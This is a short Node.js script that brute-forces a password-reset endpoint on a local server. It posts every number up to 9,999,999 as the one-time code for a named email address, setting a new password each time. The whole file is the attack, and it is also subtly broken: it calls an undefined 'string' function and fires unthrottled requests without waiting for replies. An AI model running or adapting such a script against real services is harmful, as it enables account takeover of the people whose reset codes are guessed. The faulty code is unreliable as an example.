const axios = require("axios");

async function makeRequest(otp) {
  let data = JSON.stringify({
    email: "swarnikarajsingh@gmail.com",
    otp: otp,
    newpassword: "asdsdss",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  let r = await axios.request(config);
  console.log(r.data);
}

for (let i = 0; i < 9999999; i++) {
  makeRequest(string(i));
}
